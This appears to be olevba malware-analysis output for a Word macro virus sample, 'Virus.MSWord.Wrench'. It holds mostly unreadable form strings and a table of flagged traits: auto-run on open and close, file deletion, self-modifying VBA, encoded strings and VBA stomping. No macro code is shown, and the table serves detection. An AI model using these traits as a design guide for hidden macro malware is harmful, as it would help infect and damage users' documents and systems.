VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Copyright (c) [Bench] 1999D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Copyright (c) [Bench] 1999'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

